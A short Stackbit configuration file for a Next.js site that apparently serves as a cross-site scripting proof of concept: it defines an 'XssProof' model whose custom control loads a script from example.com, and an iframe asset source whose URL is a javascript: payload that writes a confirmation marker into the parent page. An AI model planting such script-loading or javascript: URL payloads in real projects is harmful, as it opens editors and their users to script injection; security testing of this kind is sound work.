export default {
  stackbitVersion: '~0.6.0',
  ssgName: 'nextjs',
  contentSources: [
    {
      srcType: 'git',
      srcProjectId: 'default',
      rootPath: 'content',
      models: [
        {
          type: 'data',
          name: 'XssProof',
          fields: [
            { name: 'title', type: 'string', required: true },
            { name: 'description', type: 'text' },
            { name: 'heroImage', type: 'image' },
            { name: 'customControl', type: 'string', controlType: 'custom-inline-script', controlUrl: 'https://example.com/xss.js' }
          ]
        }
      ],
      assets: { type: 'git', dirPath: 'assets' }
    }
  ],
  assetSources: [
    {
      name: 'owned-iframe-source',
      type: 'iframe',
      url: "javascript:(()=>{parent.document.documentElement.setAttribute('data-create-asset-xss','confirmed');return '<!doctype html><body>safe marker</body>'})()"
    }
  ]
};
